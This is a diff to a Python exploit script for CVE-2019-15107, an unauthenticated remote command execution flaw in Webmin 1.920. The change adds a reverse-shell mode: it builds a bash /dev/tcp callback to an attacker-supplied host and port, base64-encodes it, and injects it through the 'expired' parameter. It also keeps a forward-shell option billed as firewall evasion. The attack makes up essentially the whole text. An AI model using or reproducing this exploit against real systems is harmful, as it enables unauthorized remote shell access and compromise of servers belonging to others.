@@ -6,18 +6,28 @@ import threading
 import time
 
 class Webmin():
-    def __init__(self,target):
+    def __init__(self,target,lhost,lport):
         self.target = target
-        self.input = "/dev/shm/input"
-        self.output = "/dev/shm/output"
+        self.lhost = lhost
+        self.lport = lport
         self.url = self.url_fix()
-        self.makefifo()
+        
+        if args.fs:
+            self.input = "/dev/shm/input"
+            self.output = "/dev/shm/output"
+            self.makefifo()
+             
+            self.thread = threading.Thread(target=self.readoutput, args=())
+            self.thread.daemon = True
+            self.thread.start()
 
-        self.thread = threading.Thread(target=self.readoutput, args=())
-        self.thread.daemon = True
-        self.thread.start()
-
-        self.write_cmd()
+            self.write_cmd()
+        else:
+            cmd = "bash -c 'bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1'"
+            cmd_encoded = self.base64encode(cmd)
+            print("Sending Reverse Shell payload")
+            print("user=bababooey&pam=''&expired=2 | echo '';echo " + cmd_encoded + " | base64 -d | sh'")
+            self.exploit(cmd_encoded)
         
     def url_fix(self):
         check = self.target[-1]
@@ -112,7 +122,12 @@ class Webmin():
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='CVE-2019-15107 Webmin 1.920 Unauhenticated Remote Command Execution')
     parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://webmin.site/', required=True)
+    parser.add_argument('-lhost', metavar='<lhost>', help='Your IP Address', required=False)
+    parser.add_argument('-lport', metavar='<lport>', help='Your Listening Port', required=False)
+    parser.add_argument('-fs',action='store_true',help='Forward Shell for Firewall Evasion', required=False) 
+       
     args = parser.parse_args()
-    
-    Webmin(args.t)
-    
+    try:
+        Webmin(args.t,args.lhost,args.lport)
+    except TypeError:
+        print("We need either -lhost or -lport arguments or -fs")
